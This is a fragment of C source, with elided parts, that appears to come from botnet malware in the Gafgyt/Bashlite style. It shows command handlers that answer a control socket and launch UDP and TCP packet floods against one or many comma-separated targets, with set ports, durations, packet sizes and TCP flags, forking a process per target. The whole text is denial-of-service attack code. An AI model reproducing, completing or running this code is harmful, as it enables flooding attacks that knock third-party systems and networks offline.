...
sockprintf(mainCommSock, "PROBING");
        ...
        {
                if(argc < 5 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65500 || (argc == 7 && atoi(argv[6]) < 1))
                {
                        sockprintf(mainCommSock, "UDP <target> <port (0 for random)> <time> <packet size (1 to 65500)> (time poll interval, default 10)");
                        return;
                }
                ...
                if(strstr(ip, ",") != NULL)
                {
                        ...
                        sendUDP(ip, port, time, packetsize, pollinterval);
                        _exit(0);
                }
        }
        ...
        {
                if(argc < 5 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || (argc > 6 && atoi(argv[6]) < 0) || (argc == 8 && atoi(argv[7]) < 1))
                {
                        sockprintf(mainCommSock, "TCP <target> <port (0 for random)> <time> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)");
                        return;
                }
                ...
                int psize = argc > 6 ? atoi(argv[5]) : 0;
                ...
                if(strstr(ip, ",") != NULL)
                {
                        ...
                        while(hi != NULL)
                        {
                                if(!listFork())
                                {
                                        sendTCP(hi, port, time, flags, psize, pollinterval);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
